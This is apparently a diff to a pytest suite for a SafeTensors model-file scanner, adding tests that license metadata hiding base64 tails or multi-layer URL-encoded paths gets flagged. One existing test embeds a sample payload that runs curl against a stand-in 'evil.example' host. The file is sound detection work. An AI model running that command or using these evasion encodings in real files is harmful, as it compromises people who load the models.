@@ -5,6 +5,7 @@ import struct
 from pathlib import Path
 from types import TracebackType
 from typing import Any, BinaryIO
+from urllib.parse import quote
 
 import numpy as np
 import pytest
@@ -76,6 +77,17 @@ Source reference: https://github.com/Lightricks/LTX-Video
 Additional licensing: https://ltx.io/model/licensing
 """
     return body + ("\nThis paragraph is ordinary license text and contains no executable metadata." * 10)
+
+
+def encode_url_path(path: str, passes: int) -> str:
+    encoded = path
+    for _ in range(passes):
+        encoded = quote(encoded, safe="")
+    return encoded
+
+
+def standard_wrapped_base64_tail(line_count: int) -> str:
+    return "\n".join("QUJD" * 19 for _ in range(line_count))
 
 
 def test_valid_safetensors_file(tmp_path: Path) -> None:
@@ -367,6 +379,23 @@ def test_license_metadata_document_url_and_length_are_not_suspicious(tmp_path: P
     assert not [issue for issue in result.issues if issue.rule_code == "S905"]
 
 
+def test_license_document_reconstructs_standard_wrapped_base64_tail() -> None:
+    license_text = ordinary_license_text_with_url()
+    payload = f"{license_text}\n{standard_wrapped_base64_tail(line_count=3)}"
+
+    assert SafeTensorsScanner._looks_like_ordinary_license_document(license_text)
+    assert not SafeTensorsScanner._looks_like_ordinary_license_document(payload)
+
+
+def test_license_url_residual_encoding_fails_closed() -> None:
+    encoded_prefix = encode_url_path("/releases/download/v1", passes=5)
+
+    assert SafeTensorsScanner._url_looks_like_license_reference("https://github.com/Lightricks/LTX-2/blob/main/LICENSE")
+    assert not SafeTensorsScanner._url_looks_like_license_reference(
+        f"https://github.com/Lightricks/LTX-2/{encoded_prefix}/license"
+    )
+
+
 def test_license_metadata_executable_content_is_not_suppressed(tmp_path: Path) -> None:
     file_path = tmp_path / "malicious_license_metadata.safetensors"
     payload = ordinary_license_text_with_url() + "\nimport os\nos.system('curl https://evil.example/payload')"
@@ -489,6 +518,93 @@ def test_license_metadata_wrapped_opaque_tail_keeps_length_check(tmp_path: Path)
         check.name == "Metadata Length Check"
         and check.status == CheckStatus.FAILED
         and check.details.get("key") == "license"
+        for check in result.checks
+    )
+
+
+def test_license_metadata_standard_wrapped_base64_tail_keeps_length_and_s905(tmp_path: Path) -> None:
+    file_path = tmp_path / "license_metadata_standard_wrapped_base64_tail.safetensors"
+    payload = f"{ordinary_license_text_with_url()}\n{standard_wrapped_base64_tail(line_count=3)}"
+    write_raw_safetensors(
+        file_path,
+        {
+            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
+            "__metadata__": {"license": payload},
+        },
+        b"\x00",
+    )
+
+    result = SafeTensorsScanner().scan(str(file_path))
+
+    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
+    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
+    assert any(
+        check.name == "Metadata Length Check"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("key") == "license"
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Metadata Pattern Check"
+        and check.status == CheckStatus.FAILED
+        and check.details == {"key": "license", "pattern": "https?://"}
+        for check in result.checks
+    )
+
+
+def test_license_metadata_oversized_wrapped_base64_tail_fails_closed(tmp_path: Path) -> None:
+    file_path = tmp_path / "license_metadata_oversized_wrapped_base64_tail.safetensors"
+    documentary_padding = "\n".join(
+        "License terms grant permission for use, reproduction, and distribution." for _ in range(130)
+    )
+    payload = (
+        f"{ordinary_license_text_with_url()}\n{documentary_padding}\n{standard_wrapped_base64_tail(line_count=110)}"
+    )
+    write_raw_safetensors(
+        file_path,
+        {
+            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
+            "__metadata__": {"license": payload},
+        },
+        b"\x00",
+    )
+
+    result = SafeTensorsScanner().scan(str(file_path))
+
+    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
+    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
+    assert any(
+        check.name == "Metadata Length Check"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("key") == "license"
+        for check in result.checks
+    )
+
+
+def test_license_metadata_five_layer_encoded_release_path_fails_closed(tmp_path: Path) -> None:
+    file_path = tmp_path / "license_metadata_five_layer_encoded_release_path.safetensors"
+    encoded_prefix = encode_url_path("/releases/download/v1", passes=5)
+    payload = (
+        f"{ordinary_license_text_with_url()}\n"
+        f"Additional terms: https://github.com/Lightricks/LTX-2/{encoded_prefix}/license"
+    )
+    write_raw_safetensors(
+        file_path,
+        {
+            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
+            "__metadata__": {"license": payload},
+        },
+        b"\x00",
+    )
+
+    result = SafeTensorsScanner().scan(str(file_path))
+
+    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
+    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
+    assert any(
+        check.name == "Metadata Pattern Check"
+        and check.status == CheckStatus.FAILED
+        and check.details == {"key": "license", "pattern": "https?://"}
         for check in result.checks
     )
 
